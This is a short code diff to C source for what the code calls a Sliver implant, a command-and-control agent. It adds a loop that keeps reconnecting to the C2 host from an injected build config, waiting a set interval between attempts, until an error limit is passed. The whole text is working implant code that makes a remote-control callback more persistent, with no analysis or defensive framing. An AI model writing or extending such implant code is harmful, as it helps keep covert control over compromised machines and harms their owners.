@@ -501,7 +501,29 @@ static int run_from_build_config(const char *argv0) {
   cfg.reg = reg;
 
   LOG_INFO("starting from injected config: %s:%u (%s)", host, (unsigned)cfg.port, c2);
-  return sliver_session_run(&cfg) == 0 ? 0 : 1;
+
+  /* Sliver implants do not give up after one failed connection: retry every
+   * ReconnectInterval until MaxConnectionErrors is exceeded. */
+  {
+    int attempts = 0;
+    int max_errors = sliver_config_max_connection_errors();
+    long long reconnect_ms = sliver_config_reconnect_interval_ns() / 1000000LL;
+    if (reconnect_ms <= 0) {
+      reconnect_ms = 60000;
+    }
+    for (;;) {
+      if (sliver_session_run(&cfg) == 0) {
+        return 0; /* peer closed the session cleanly */
+      }
+      attempts++;
+      if (max_errors > 0 && attempts > max_errors) {
+        LOG_ERROR("giving up after %d connection attempts", attempts);
+        return 1;
+      }
+      LOG_INFO("reconnect in %lld ms (attempt %d/%d)", reconnect_ms, attempts, max_errors);
+      sliver_sleep_ms((uint32_t)reconnect_ms);
+    }
+  }
 }
 
 static void print_diagnostics(void) {
